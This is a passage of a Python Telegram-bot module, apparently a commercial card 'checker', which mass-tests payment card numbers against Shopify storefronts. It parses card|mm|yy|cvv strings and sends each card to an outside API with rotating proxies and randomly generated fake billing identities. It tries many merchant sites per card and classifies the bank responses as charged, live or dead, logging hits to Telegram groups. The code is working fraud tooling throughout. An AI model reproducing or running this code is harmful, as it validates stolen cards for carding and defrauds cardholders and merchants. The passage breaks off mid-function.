"""
sh.py  v17  —  /sh single-card + /msh mass Shopify checker
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Framework : python-telegram-bot v21+
API       : https://goshopi.up.railway.app/shopii
            ?site=BARE_DOMAIN&cc=cc|mm|yy|cvv&proxy=proxy
            ← proxy IS REQUIRED — without it API returns 404
Proxies   : px.txt (shuffled, rotated — different proxy per attempt)
Sites     : sites.txt (shuffled, bare domain stripped automatically)
Retries   : SITE_RETRIES different sites per card

API RESPONSE FIELDS:
  Response  — bank/site response string
  Price     — charge amount (e.g. "1.00")
  Currency  — currency code (e.g. "USD")
  Gateway   — must be "SHOPIFY PAYMENTS" or site is bad
  Proxy     — proxy status string ("live"/"dead")
  Status    — "true"/"false"

VERDICT LOGIC (sourced from sitechk.py / msh.py reference):
  CHARGED → ORDER_PAID / CHARGED / CAPTURED / PAYMENT_AUTHORIZED
  TDS     → 3DS_REQUIRED / AUTHENTICATION_REQUIRED
  LIVE    → INSUFFICIENT_FUNDS / INCORRECT_CVV / DO NOT HONOR /
            PICK_UP_CARD / AMOUNT_TOO_SMALL / INCORRECT_ZIP / etc.
  DEAD    → CARD_DECLINED / GENERIC_DECLINE / GENERIC_ERROR /
            EXPIRED_CARD / FRAUD_SUSPECTED / UNKNOWN_ERROR / etc.
  RETRY   → gateway ≠ SHOPIFY PAYMENTS, or site error, or network failure

EXPORTS FOR main.py:
  get_sh_handler()          → single CommandHandler("sh", cmd_sh)
  _check_card_with_retry()  → retry loop used by main.py's cmd_msh
  SITE_RETRIES / SITE_TIMEOUT
  MSH_SESSIONS, run_mass_batch, create_msh_session
  cb_msh_result, cb_msh_stop, build_result_msg
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
from __future__ import annotations

import asyncio
import logging
import random
import re
import string
import time
from datetime import datetime
from html import escape
from io import BytesIO
from typing import Optional

import aiohttp
from telegram import Update, InputFile
from telegram.ext import CommandHandler, CallbackQueryHandler, ContextTypes

from config import (
    OWNER_ID, FORCE_CHANNELS,
    get_bin_info, tg_emoji,
    get_plan_emoji_id, get_random_live_emoji,
    RawMarkup, _btn,
    CARD_EMOJI_ID, USER_EMOJI_ID, TIME_EMOJI_ID,
    DEV_EMOJI_ID, PRO_EMOJI_ID,
    PROG_GATE_EMOJI_ID, PROG_PROGRESS_EMOJI_ID, PROG_CHARGED_EMOJI_ID,
    PROG_LIVE_EMOJI_ID, PROG_DEAD_EMOJI_ID, PROG_ERRORS_EMOJI_ID,
    LIVE_EMOJI_IDS, PLAN_EMOJIS, SPECIAL_FONT_MAP,
    BOT_NAME, CHANNEL_LINK,
)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CONSTANTS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
API_URL      = "https://goshopi.up.railway.app/shopii"
BOT_CHANNEL  = CHANNEL_LINK
DEV_LINK_HTML = f'<a href="{BOT_CHANNEL}">{BOT_NAME}</a>'

HIT_LOG_GROUP_ID       = -1004361062205
EXTRA_CHARGED_GROUP_ID = -1003991915326

SH_COOLDOWN    = 25      # free-user cooldown between /sh calls (seconds)

SITE_RETRIES   = 999     # try ALL sites from sites.txt until a real result
SITE_TIMEOUT   = 90      # per-request timeout (seconds)
MAX_CONCURRENT = 80      # parallel cards in mass check
PROGRESS_EVERY = 3       # update progress bar every N cards
BUTTON_LOCK    = 10      # lock download buttons for N seconds after start

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# EMOJI IDS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
DECLINED_EMOJI_ID    = "4956612582816351459"
HIT_RESP_EMOJI_ID    = "5839116473951328489"
BTN_LIVE_EMOJI_ID    = "5039793437776282663"
BTN_CHARGED_EMOJI_ID = "5465465194056525619"
BTN_ALL_EMOJI_ID     = "4956324463525233747"
BTN_STOP_EMOJI_ID    = "6179444193518162239"

CHARGED_EMOJI_IDS = [
    "5801154993188770160", "4956739572114392015", "5285221724634239278",
    "5287777298894835685", "5285024405246725814", "5287547831677112267",
    "5287658362660474522", "5285186510197381130", "5803233241963959320",
    "5462902520215002477", "5787435351521889877", "5323674506705785412",
    "5801005158959683238", "5436143465211640305", "5800688138833629633",
    "5891044423856296980", "5436068999068662274", "5427168083074628963",
]

_CB_RESULT = "mshr"
_CB_STOP   = "mshs"

MSH_SESSIONS: dict = {}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# FAKE BILLING DATA  (injected into every API call)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
_FIRST = ["James","John","Robert","Michael","William","David","Richard",
          "Emma","Olivia","Sophia","Mia","Charlotte","Amelia","Harper"]
_LAST  = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller",
          "Davis","Rodriguez","Martinez","Wilson","Anderson","Taylor"]
_STREETS = ["123 Main St","456 Oak Ave","789 Pine Rd","321 Maple Dr",
            "654 Elm St","987 Cedar Ln","147 Birch Blvd","258 Walnut Way"]
_CITIES  = [
    ("New York","NY","10001"), ("Los Angeles","CA","90001"),
    ("Chicago","IL","60601"),  ("Houston","TX","77001"),
    ("Phoenix","AZ","85001"),  ("Dallas","TX","75201"),
    ("San Diego","CA","92101"),("San Jose","CA","95101"),
]

def _fake_billing() -> dict:
    first  = random.choice(_FIRST)
    last   = random.choice(_LAST)
    city, state, zip_ = random.choice(_CITIES)
    phone  = f"+1{''.join(random.choices('0123456789', k=10))}"
    email  = f"{first.lower()}.{last.lower()}{random.randint(10,99)}@gmail.com"
    return {
        "fname": first, "lname": last,
        "address": random.choice(_STREETS),
        "city": city, "state": state, "zip": zip_,
        "country": "US", "phone": phone, "email": email,
    }

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PROXY LOADER  — px.txt first, then proxies.txt
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# ── Global proxy pool — loaded once, shared by ALL workers ──────────
_ALL_PROXIES: list = []

def _load_proxies() -> list:
    """
    Load ALL proxies from px.txt (priority) or proxies.txt.
    Proxies are stored RAW (ip:port or ip:port:user:pass) because the
    API receives the proxy as a query-string value — NOT as an HTTP URL.
    Sending 'http://ip:port' causes the API to return 404.
    """
    global _ALL_PROXIES

    import os
    search_paths = []
    for fname in ("px.txt", "proxies.txt"):
        search_paths.append(fname)
        search_paths.append(os.path.join("..", fname))
        search_paths.append(os.path.join(os.path.dirname(__file__), fname))

    for path in search_paths:
        try:
            with open(path, encoding="utf-8", errors="ignore") as f:
                raw = [l.strip() for l in f
                       if l.strip() and not l.startswith(("#", "//", ";"))]
            if raw:
                # Strip any http:// / https:// / socks5:// prefix —
                # the API wants the bare proxy string, e.g. "1.2.3.4:8080"
                def _strip_proxy_scheme(p: str) -> str:
                    for pfx in ("socks5://", "socks4://", "https://", "http://"):
                        if p.startswith(pfx):
                            return p[len(pfx):]
                    return p
                lines = [_strip_proxy_scheme(p) for p in raw]
                _ALL_PROXIES = lines
                logging.info(f"[SH] Loaded {len(lines)} proxies from {path}")
                return lines
        except (FileNotFoundError, PermissionError):
            pass

    logging.warning("[SH] No proxy file found — API REQUIRES proxies (px.txt)!")
    _ALL_PROXIES = []
    return []

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SITE LOADER — sites.txt, shuffled, bare-domain stripped
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _strip_scheme(url: str) -> str:
    """Remove https:// / http:// / www. from a domain for the API."""
    url = url.strip()
    for pfx in ("https://", "http://", "www."):
        if url.startswith(pfx):
            url = url[len(pfx):]
    return url.rstrip("/")

def _load_sites() -> list:
    """
    Load ALL sites from sites.txt (searched in cwd, parent dir, and
    script dir). Strips https:// so the API gets bare domains.
    Sites are shuffled so every card starts from a different position.
    """
    import os
    search_paths = [
        "sites.txt",
        os.path.join("..", "sites.txt"),
        os.path.join(os.path.dirname(__file__), "sites.txt"),
    ]
    for path in search_paths:
        try:
            with open(path, encoding="utf-8", errors="ignore") as f:
                lines = [_strip_scheme(l) for l in f
                         if l.strip() and not l.startswith("#")]
            lines = [l for l in lines if l]
            if lines:
                random.shuffle(lines)
                logging.info(f"[SH] Loaded {len(lines)} sites from {path}")
                return lines
        except (FileNotFoundError, PermissionError):
            pass
    logging.warning("[SH] sites.txt not found — using fallback site")
    return ["aloracosmetics.myshopify.com"]

def _norm_proxy(p: str) -> str:
    p = p.strip()
    if p.startswith(("http://","https://","socks5://","socks4://")):
        return p
    return f"http://{p}"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CARD UTILITIES
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def luhn_check(n: str) -> bool:
    n = str(n).strip()
    if not n.isdigit():
        return False
    total = 0
    for i, c in enumerate(n[::-1]):
        d = int(c)
        if i % 2 == 1:
            d *= 2
            if d > 9:
                d -= 9
        total += d
    return total % 10 == 0

def is_expired(mm: str, yy: str) -> bool:
    try:
        now = datetime.now()
        ey, em = int(yy), int(mm)
        if ey < now.year % 100:   return True
        if ey == now.year % 100 and em < now.month: return True
        return False
    except ValueError:
        return True

def extract_cards(text: str) -> list:
    pats = [
        r"(\d{13,19})\s*[|/:=]\s*(\d{1,2})\s*[|/:=]\s*(\d{2,4})\s*[|/:=]\s*(\d{3,4})",
        r"(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})",
    ]
    seen, results = set(), []
    for pat in pats:
        for m in re.findall(pat, text):
            cc, mm, yy, cvv = m
            mm = mm.zfill(2)
            if len(yy) == 4: yy = yy[2:]
            s = f"{cc}|{mm}|{yy}|{cvv}"
            if s not in seen:
                seen.add(s)
                results.append(s)
    return results

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RESPONSE CLASSIFIER
# Ground-truth built from sitechk.py SUCCESS_RESPONSES + DEAD_ERRORS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# These mean the SITE is broken — try a different site, don't touch the card
# (Sourced verbatim from sitechk.py DEAD_ERRORS)
_SITE_ERRORS = {
    "site error! status: 404", "site error! status: 500",
    "site error! status: 402", "site error! status: 502",
    "site error! 503",         "site error! status: 503",
    "site error! status: 403", "site error! status: 401",
    "site not supported for now!",
    "connection error", "connection error!",
    "error processing card",
    "failed to get token", "failed to get checkout",
    "failed to add to cart", "site overloaded", "site rate limited",
    "failed to get session token", "unable to get payment token",
    "no valid products",
    "payment method is not shopify!", "not shopify!",
    "site requires login!", "validation_custom",
    "timeout", "http error", "json", "curl error",
    "could not resolve", "connect tunnel failed", "max retries",
    "amount_too_small",
    "buyer_identity_marketing_consent",
    "step 1 failed", "step 0 failed", "step 2 failed", "step 3 failed",
    "step 4 failed", "step 5 failed", "step 6 failed", "step 7 failed",
    "step 9 failed", "step 10 failed",
    "missing stableid", "missing buildid", "missing sourcetoken",
    "checkout_failed", "delivery_out_of_stock_at_origin_location",
    "could not extract private_access_token", "no_products",
    "buyer_identity_currency_not_supported_by_shop",
    "could not find actions js url", "session_error",
    "delivery_zone_not_found",
    "missing proposal", "missing submit id",
    "delivery_strategy_conditions_not_satisfied",
    "retryable: inventory reservation failure", "inventory_failure",
    "delivery_no_delivery_strategy_available_for_merchandise_line",
    "exceeded 30 poll attempts",
    "delivery_no_delivery_strategy_available",
    "could not extract queuetoken",
    "could not extract identification signature",
    "could not extract session id",
    "payments_credit_card_brand_not_supported",
    "could not extract delivery handle",
    "could not extract signedhandles",
    "could not extract shipping amount",
    "could not extract total amount",
    "could not extract receiptid",
    "could not extract sessiontoken",
    "errstoreincompatible", "errmissingreceiptid",
    # catch-all network fragments
    "application not found",
    "app not found",
    "store not found",
    "shop not found",
    "not found",
    "proxy error",
    "no proxies available",
    "connection reset",
    "network error",
    "api timeout",
    "connection timed out",
    "connection failed",
    "invalid json",
    "json decode",
    "missing receiptid",
    "products.json",
    "site incompatible",
    "store incompatible",
    "site not supported",
    "site overloaded",
    "delivery_delivery_line_detail_changed",
}


def classify_response(resp: str, gateway: str = "") -> str:
    """
    Classify a raw API response into: CHARGED | TDS | LIVE | DEAD | RETRY

    Logic:
    1. Gateway not "SHOPIFY PAYMENTS" → RETRY (bad site)
    2. ORDER_PAID / CAPTURED / etc.  → CHARGED
    3. 3DS_REQUIRED / etc.           → TDS  (card is alive, needs auth)
    4. INSUFFICIENT_FUNDS / INCORRECT_CVV / etc. → LIVE
    5. CARD_DECLINED / GENERIC_ERROR / etc.       → DEAD
    6. Any site error string          → RETRY
    7. Unknown                        → RETRY (safe default)
    """
    # ── 1. Gateway check ────────────────────────────────
    if gateway and gateway.strip().upper() != "SHOPIFY PAYMENTS":
        return "RETRY"

    if not resp:
        return "RETRY"

    ru = resp.upper().strip()
    rl = resp.lower().strip()

    # ── 2. CHARGED ──────────────────────────────────────
    if any(x in ru for x in (
        "ORDER_PAID", "PAYMENT_AUTHORIZED", "PAYMENT_CAPTURED",
        "TRANSACTION_APPROVED", "SUBSCRIPTION_CREATED",
        "CHARGE_SUCCEEDED", "CAPTURED",
    )):
        return "CHARGED"
    # plain "CHARGED" word but not inside another token
    if ru == "CHARGED" or ru.startswith("CHARGED "):
        return "CHARGED"

    # ── 3. 3DS ──────────────────────────────────────────
    if any(x in ru for x in (
        "3DS_REQUIRED", "3D_SECURE", "3D SECURE",
        "AUTHENTICATION_REQUIRED", "REDIRECT_TO_3DS",
    )):
        return "TDS"

    # ── 4. LIVE — bank confirmed card is real ────────────
    # (sources: sitechk SUCCESS_RESPONSES that mean "soft decline" /
    #  "card exists but can't charge right now")
    if any(x in ru for x in (
        "INSUFFICIENT_FUNDS", "INSUFFICIENT FUNDS",
        "INCORRECT_CVV", "INVALID_CVC", "INCORRECT_CVV",
        "CVV_FAILED", "CVC_FAILED",
        "INCORRECT_ZIP", "ZIP_MISMATCH", "ADDRESS_MISMATCH",
        "PICK_UP_CARD", "PICKUP_CARD",
        "DO NOT HONOR", "DO_NOT_HONOR",
        "ONLINE_OR_CONTACTLESS_TRANSACTION_NOT_ALLOWED",
        "REFER_TO_CARD_ISSUER",
    )):
        return "LIVE"
    if ru == "APPROVED" or (ru.startswith("APPROVED") and "NOT" not in ru):
        return "LIVE"

    # ── 5. DEAD — confirmed hard bank decline ────────────
    # These are in sitechk SUCCESS_RESPONSES (site works) but for card
    # checking they mean the card is definitively dead.
    if any(x in ru for x in (
        "CARD_DECLINED",
        "GENERIC_DECLINE",
        "GENERIC_ERROR",
        "UNKNOWN_ERROR",
        "PROCESSING ERROR",
        "EXPIRED_CARD",
        "INVALID_CARD_NUMBER", "INCORRECT_NUMBER",
        "LOST_CARD", "STOLEN_CARD",
        "FRAUD_SUSPECTED",
        "DECISION_RULE_BLOCK",
        "INVALID_PURCHASE_TYPE",
        "INVALID_PAYMENT_METHOD",
        "ACCOUNT_CLOSED", "INVALID_ACCOUNT", "ACCOUNT_FROZEN",
        "SECURITY_VIOLATION", "SERVICE_NOT_ALLOWED",
        "TRANSACTION_NOT_ALLOWED", "TRANSACTION NOT ALLOWED",
        "RESTRICTED_CARD", "RESTRICTED CARD",
        "WITHDRAWAL_COUNT_LIMIT_EXCEEDED",
        "TRY_AGAIN_LATER",
    )):
        return "DEAD"

    # exact match catch for "Processing Error" (mixed case from API)
    if rl in ("processing error", "card_declined", "generic_error",
              "generic_decline", "unknown_error"):
        return "DEAD"

    # ── 6. RETRY — site error ────────────────────────────
    if any(s in rl for s in _SITE_ERRORS):
        return "RETRY"
    if ru in ("TIMEOUT", "ERROR", "UNKNOWN", ""):
        return "RETRY"

    # ── 7. Unknown → RETRY (safe: try another site) ─────
    return "RETRY"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# API CALL
# API expects: ?site=BARE_DOMAIN&cc=card&proxy=proxy
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def _call_api(
    session: aiohttp.ClientSession,
    card: str,
    site: str,              # bare domain (no https://)
    proxy: Optional[str],
    timeout: float = SITE_TIMEOUT,
) -> dict:
    """
    Call goshopi shopii API.
    site must be a bare domain e.g. "store.myshopify.com"
    proxy is REQUIRED by the API — without it you get HTTP 404.
    """
    site = _strip_scheme(site)   # guarantee bare domain

    params: dict = {"cc": card, "site": site}
    if proxy:
        params["proxy"] = proxy

    # Inject fake billing data
    b = _fake_billing()
    params.update(b)

    try:
        async with session.get(
            API_URL, params=params,
            timeout=aiohttp.ClientTimeout(total=timeout),
            ssl=False,
        ) as resp:
            if resp.status != 200:
                return {"Response": f"site error! status: {resp.status}",
                        "Gateway": "", "Price": "0.00", "Currency": "USD"}
            try:
                data = await resp.json(content_type=None)
                return data
            except Exception:
                raw = await resp.text()
                return {"Response": raw[:200], "Gateway": "",
                        "Price": "0.00", "Currency": "USD"}
    except asyncio.TimeoutError:
        return {"Response": "timeout", "Gateway": "", "Price": "0.00", "Currency": "USD"}
    except asyncio.CancelledError:
        raise
    except Exception as e:
        return {"Response": f"connection error: {str(e)[:60]}",
                "Gateway": "", "Price": "0.00", "Currency": "USD"}


def _parse_api(data: dict) -> tuple:
    """Return (response_str, gateway_str, price_str, currency_str)."""
    resp     = str(data.get("Response", data.get("response", "")) or "").strip()
    gateway  = str(data.get("Gateway",  data.get("gateway",  "")) or "").strip()
    price    = str(data.get("Price",    data.get("price",    "0.00")) or "0.00").strip()
    currency = str(data.get("Currency", data.get("currency", "USD")) or "USD").strip()
    return resp, gateway, price, currency

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CORE RETRY LOOP
# Tries every site from sites.txt (shuffled) per card.
# RETRY verdict → skip to next site (site error, card untouched).
# CHARGED/LIVE/DEAD/TDS → return immediately.
# If ALL sites return RETRY → ERROR (no working site found).
# max_sites caps how many sites to try (SITE_RETRIES=999 = all).
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def _check_card_with_retry(
    session: aiohttp.ClientSession,
    card: str,
    sites: list,
    proxies: list,
    max_sites: int = SITE_RETRIES,
    site_timeout: float = SITE_TIMEOUT,
    sid: str = "",
) -> tuple:
    """
    Returns (verdict, raw_response, price, currency).
    verdict: CHARGED | TDS | LIVE | DEAD | ERROR

    Tries every site in the pool (up to max_sites) with a fresh random
    proxy each time.  Stops the moment a bank response is received.
    Stops after all unique sites are exhausted (does NOT cycle back).
    """
    if not sites:
        sites = ["aloracosmetics.myshopify.com"]

    # Shuffle a copy so each card gets a different starting site
    pool = sites[:]
    random.shuffle(pool)

    # Use passed-in list OR fall back to global pool.
    px_pool = proxies if proxies else _ALL_PROXIES

    price, currency = "0.00", "USD"
    last_resp = "All sites failed"

    # Iterate every site exactly once (capped at max_sites).
    # No cycling — if all sites fail, card gets ERROR.
    limit = min(max_sites, len(pool))
    for attempt in range(limit):
        # Check stop flag for mass sessions
        if sid and MSH_SESSIONS.get(sid, {}).get("status") == "STOPPED":
            raise asyncio.CancelledError()

        site = pool[attempt]   # already shuffled; each index = unique site

        # Random proxy from the FULL pool — raw "ip:port" string.
        # The API receives proxy as a query param (NOT an HTTP proxy URL).
        # Sending "http://ip:port" causes the API to return 404.
        if px_pool:
            proxy = random.choice(px_pool)
        else:
            proxy = None   # WARNING: API returns 404 without a proxy

        try:
            data = await _call_api(session, card, site, proxy, timeout=site_timeout)
        except asyncio.CancelledError:
            raise
        except Exception:
            continue

        resp, gateway, price, currency = _parse_api(data)
        verdict = classify_response(resp, gateway)
        last_resp = resp

        logging.debug(f"[SH] {card[:6]}*** attempt={attempt+1}/{limit} "
                      f"site={site} proxy={proxy} gw={gateway!r} "
                      f"resp={resp!r} → {verdict}")

        if verdict in ("CHARGED", "TDS", "LIVE", "DEAD"):
            return verdict, resp, price, currency
        # RETRY → continue to next site

    return "ERROR", last_resp, price, currency

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PERSISTENT HTTP SESSION FOR /sh
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
_SH_HTTP: Optional[aiohttp.ClientSession] = None
_BIN_CACHE: dict = {}

async def _sh_session() -> aiohttp.ClientSession:
    global _SH_HTTP
    if _SH_HTTP is None or _SH_HTTP.closed:
        conn = aiohttp.TCPConnector(limit=200, limit_per_host=60,
                                    keepalive_timeout=60, ssl=False)
        _SH_HTTP = aiohttp.ClientSession(
            connector=conn,
            headers={"User-Agent": "Mozilla/5.0 (BatChk/17)"},
            timeout=aiohttp.ClientTimeout(total=SITE_TIMEOUT + 5),
        )
    return _SH_HTTP

async def _bin_lookup(bin6: str) -> dict:
    if bin6 in _BIN_CACHE:
        return _BIN_CACHE[bin6]
    try:
        result = await asyncio.wait_for(get_bin_info(bin6), timeout=8) or {}
    except Exception:
        result = {}
    _BIN_CACHE[bin6] = result
    return result

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MISC HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _te(eid: str, fb: str = "●") -> str:
    return f'<tg-emoji emoji-id="{eid}">{fb}</tg-emoji>'

def _plan_eid(plan: str) -> str:
    norm = "".join(SPECIAL_FONT_MAP.get(c, c.upper()) for c in (plan or ""))
    if norm in PLAN_EMOJIS:
        return PLAN_EMOJIS[norm]
    for k, v in PLAN_EMOJIS.items():
        if k in norm: return v
    return PRO_EMOJI_ID

def _user_link(user) -> str:
    name = escape(getattr(user, "first_name", None) or "User")
    if getattr(user, "username", None):
        return f'<a href="https://t.me/{user.username}">{name}</a>'
    return f'<a href="tg://user?id={user.id}">{name}</a>'

def _fmt_time(s: float) -> str:
    s = int(s)
    return f"{s//60}m {s%60}s" if s >= 60 else f"{s}s"

def _fmt_price(price: str, currency: str) -> str:
    try:
        v = float(re.sub(r"[^\d.]", "", price or ""))
        if v > 0:
            return f"{v:.2f} {escape(currency)}"
    except Exception:
        pass
    return "0-20$"

def _is_premium(ud: dict, uid: int) -> bool:
    return (uid == OWNER_ID or ud.get("premium", False)
            or ud.get("plan") not in (None, "TRIAL"))

def _get_ud(uid: int, ctx) -> dict:
    return ctx.bot_data.setdefault("users", {}).setdefault(uid, {})

def _sid() -> str:
    return "".join(random.choices(string.ascii_uppercase + string.digits, k=8))

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# BIN FORMATTER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _bin_str(bd: dict) -> str:
    scheme  = escape(str(bd.get("scheme",  "N/A")).upper())
    bank    = escape(str(bd.get("bank",    "N/A")))
    country = escape(str(bd.get("country", "N/A")))
    flag    = bd.get("country_emoji", "")
    cstr    = f"{flag} {country}".strip() if flag else country
    return f"{scheme} - {bank} - {cstr}"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RESULT MESSAGE BUILDER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def build_result_msg(
    card: str, resp: str, verdict: str,
    bin_data: dict, price: str, currency: str,
    elapsed: float, user, plan: str,
) -> str:
    ulink     = _user_link(user)
    peid      = _plan_eid(plan)
    ts        = _fmt_time(elapsed)
    price_str = _fmt_price(price, currency)
    bin_s     = _bin_str(bin_data)
    ch_link   = f'<a href="{BOT_CHANNEL}">[❆]</a>'
    safe_resp = escape(resp)

    if verdict == "CHARGED":
        eid        = random.choice(CHARGED_EMOJI_IDS)
        status_ln  = f'<b>{ch_link} Charged {_te(eid,"💎")}</b>'
        gate_ln    = f'<b>Gate ➳ Shopify | {price_str}</b>'
    elif verdict == "TDS":
        live_eid   = get_random_live_emoji()
        status_ln  = f'<b>{ch_link} Live {_te(live_eid,"✅")} [3DS]</b>'
        gate_ln    = f'<b>Gate ➳ Shopify | 0-20$</b>'
    elif verdict == "LIVE":
        live_eid   = get_random_live_emoji()
        status_ln  = f'<b>{ch_link} Live {_te(live_eid,"✅")}</b>'
        gate_ln    = f'<b>Gate ➳ Shopify | 0-20$</b>'
    elif verdict == "DEAD":
        status_ln  = f'<b>{ch_link} Dead {_te(DECLINED_EMOJI_ID,"❌")}</b>'
        gate_ln    = f'<b>Gate ➳ Shopify | 0-20$</b>'
    else:   # ERROR
        status_ln  = f'<b>{ch_link} Error {_te(DECLINED_EMOJI_ID,"⚠️")}</b>'
        gate_ln    = f'<b>Gate ➳ Shopify | 0-20$</b>'

    return (
        f"{status_ln}\n\n"
        f"<b>{_te(CARD_EMOJI_ID,'💳')}</b>\n"
        f"<b>   ⤷ <code>{escape(card)}</code></b>\n"
        f"{gate_ln}\n"
        f"<b>──────────</b>\n"
        f"<b>Resp ➳ {safe_resp}</b>\n"
        f"<b>Bin  ➳ {bin_s}</b>\n"
        f"<b>──────────</b>\n"
        f"<b>{_te(TIME_EMOJI_ID,'⏱')} ➳ {ts}</b>\n"
        f"<b>{_te(USER_EMOJI_ID,'👤')} ➳ {ulink} {_te(peid,'⭐')}</b>\n"
        f"<b>{_te(DEV_EMOJI_ID,'⚡')} ➳ {DEV_LINK_HTML} {_te(PRO_EMOJI_ID,'⭐')}</b>"
    )

_build_result_msg = build_result_msg   # backward-compat alias

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MSH BUTTONS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _msh_buttons(sid: str, running: bool) -> RawMarkup:
    s  = MSH_SESSIONS.get(sid, {})
    ch = s.get("charged", 0)
    lv = s.get("live",    0)
    ck = s.get("checked", 0)
    rows = [
        [
            _btn(f"Charged ({ch})", cb=f"{_CB_RESULT}:{sid}:charged",
                 style="primary", icon=BTN_CHARGED_EMOJI_ID),
            _btn(f"Live ({lv})", cb=f"{_CB_RESULT}:{sid}:live",
                 style="primary", icon=BTN_LIVE_EMOJI_ID),
        ],
        [_btn(f"All ({ck})", cb=f"{_CB_RESULT}:{sid}:all",
              style="primary", icon=BTN_ALL_EMOJI_ID)],
    ]
    if running:
        rows.append([_btn("⛔ Stop", cb=f"{_CB_STOP}:{sid}",
                          style="danger", icon=BTN_STOP_EMOJI_ID)])
    return RawMarkup(rows)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MSH PROGRESS TEXT
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _progress_text(sess: dict) -> str:
    ts    = _fmt_time(time.time() - sess["start_time"])
    ulink = _user_link(sess["user_obj"]) if sess.get("user_obj") else "User"
    peid  = sess.get("plan_eid", PRO_EMOJI_ID)
    return (
        f'<b>{_te(PROG_GATE_EMOJI_ID,"🛒")} Gate ➳ Shopify</b>\n'
        f'<b>{_te(PROG_PROGRESS_EMOJI_ID,"🔄")} Progress ➳ {sess["checked"]}/{sess["total"]}</b>\n'
        f'<b>Charged ➳ {sess["charged"]} {_te(PROG_CHARGED_EMOJI_ID,"💎")}</b>\n'
        f'<b>Live    ➳ {sess["live"]} {_te(PROG_LIVE_EMOJI_ID,"✅")}</b>\n'
        f'<b>Dead    ➳ {sess["dead"]} {_te(PROG_DEAD_EMOJI_ID,"❌")}</b>\n'
        f'<b>Errors  ➳ {sess["errors"]} {_te(PROG_ERRORS_EMOJI_ID,"⚠️")}</b>\n'
        f'<b>Proxies ➳ {sess.get("proxy_count", len(_ALL_PROXIES))}</b>\n'
        f'<b>Time    ➳ {ts}</b>\n'
        f'<b>{_te(USER_EMOJI_ID,"👤")} ➳ {ulink} {_te(peid,"⭐")}</b>\n'
        f'<b>{_te(DEV_EMOJI_ID,"⚡")} ➳ {DEV_LINK_HTML} {_te(PRO_EMOJI_ID,"⭐")}</b>'
    )

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MSH RESULT FILE
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _make_result_file(sess: dict, kind: str) -> tuple:
    if kind == "charged":
        cards = sess.get("charged_cards", [])
    elif kind == "live":
        cards = sess.get("live_cards", [])
    elif kind == "dead":
        cards = sess.get("dead_cards", [])
    else:
        cards = (sess.get("charged_cards",[]) + sess.get("live_cards",[])
                 + sess.get("dead_cards",[])  + sess.get("error_cards",[]))

    label     = kind.capitalize()
    user_name = (sess.get("user_obj") and
                 (getattr(sess["user_obj"], "first_name", None) or "User")) or "User"
    lines = [
        f"Gate  ➳ Shopify | 0-20$",
        f"Type  ➳ {label}",
